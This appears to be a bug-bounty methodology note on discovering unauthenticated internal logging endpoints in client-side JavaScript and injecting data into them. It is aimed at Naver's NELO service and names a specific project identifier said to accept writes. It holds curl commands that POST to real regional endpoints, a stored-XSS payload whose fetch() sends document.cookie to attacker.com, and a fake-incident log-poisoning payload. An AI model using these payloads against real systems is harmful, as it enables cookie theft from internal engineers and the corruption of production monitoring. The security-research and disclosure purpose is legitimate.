# Internal Logging Endpoint Injection

## Overview

Many SPA/microservice applications embed internal logging endpoint URLs and project identifiers in client-side JavaScript bundles. These endpoints often accept writes without authentication because they were designed for internal service-to-service communication.

## Discovery Pattern

### 1. Search JS bundles for logging indicators
```bash
# Common patterns in JS bundles
curl -s "https://TARGET/dist/main.*.js" | grep -o 'nelo\|sentry\|datadog\|newrelic\|logstash\|fluentd\|_store\|projectName\|logLevel'

# Extract full URLs
curl -s "https://TARGET/dist/main.*.js" | grep -o 'https\?://[^"'\'')\` ]*' | grep -i 'col\|log\|nelo\|sentry\|monitor'

# Find project identifiers (NELO pattern: P[hex]_[name])
curl -s "https://TARGET/dist/main.*.js" | grep -o "P[0-9a-f]*_[a-z_]*" | sort -u
```

### 2. Known logging platforms and endpoints
| Platform | Endpoint Pattern | Auth Check? |
|----------|-----------------|-------------|
| Naver NELO | `*-col-ext.nelo.navercorp.com/_store` | Often NO |
| Sentry | `*.ingest.sentry.io/api/PROJECT_ID/envelope/` | DSN in URL |
| Datadog | `*.browser-intake-datadoghq.com/api/v2/logs` | Client token in URL |

### 3. NELO-specific testing
```bash
# Basic write test
curl -s -X POST "https://jp-col-ext.nelo.navercorp.com/_store" \
  -H "Content-Type: application/json" \
  -d '{"projectName":"PROJECT_ID","projectVersion":"1.0","logLevel":"INFO","body":"poc-test","logSource":"test","logType":"nelo2-http"}'

# Expected success: {"code":200,"message":"Success"}
# Expected failure: {"code":400,"message":"...Invalid project..."}
```

## Exploitation

### Stored XSS in internal dashboards
```json
{
  "projectName":"P6349d1_cstalk_connect",
  "projectVersion":"1.0",
  "logLevel":"FATAL",
  "body":"<img src=x onerror=\"fetch('https://attacker.com/steal?c='+document.cookie)\">",
  "logSource":"prod-api-gw",
  "logType":"nelo2-http",
  "host":"worker-01.internal"
}
```

### Log poisoning / fake incident injection
```json
{
  "projectName":"PROJECT_ID",
  "projectVersion":"1.0",
  "logLevel":"FATAL",
  "body":"CRITICAL: Database credentials exposed - admin:password@db-prod:5432",
  "logSource":"api-gateway",
  "logType":"nelo2-http"
}
```

### Multi-region confirmation
Test all regional endpoints found in JS:
- `jp-col-ext.nelo.navercorp.com/_store`
- `kr-col-ext.nelo.navercorp.com/_store`

## Impact Assessment

| Condition | Severity |
|-----------|----------|
| Write accepted + XSS payload stored | Medium-High |
| Write accepted + can impersonate any service | Medium |
| Write rejected (needs projectKey) | Not exploitable |

## Key Lesson (LINE Works June 2026)

- Found 4 project names in JS bundle
- Only 1 accepted writes without projectKey (`P6349d1_cstalk_connect`)
- Others required `projectKey` or `txtToken`
- Both JP and KR regional endpoints accepted the same project
- This was the ONLY finding with proven state change on the entire target

## Reporting Notes

- Frame as: "Unauthenticated write access to internal monitoring system"
- Impact: Stored XSS targeting internal engineers, log integrity compromise, fake incident injection
- The blind nature (can't see dashboard) doesn't reduce severity — stored XSS is stored XSS
- CWE-117 (Log Injection) + CWE-79 (Stored XSS)
